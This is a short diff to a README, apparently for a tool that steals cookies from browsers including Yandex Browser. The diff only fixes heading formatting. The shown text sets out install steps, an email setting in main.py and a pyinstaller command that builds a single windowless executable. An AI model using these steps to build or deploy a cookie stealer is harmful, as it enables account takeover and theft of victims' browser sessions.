@@ -19,17 +19,17 @@ Cookies stealing from
 * Yandex Browser
 
 ## Installing
-###Install lib
+### Install lib
 ```
 python -m pip install pywin32
 python -m pip install pysqlite3
 
 ```
 
-###email
+### email
 change email setting in main.py
 
-###pyinstaller
+### pyinstaller
 ```
 python -m pip install pyinstaller
 pyinstaller main.py -F -w
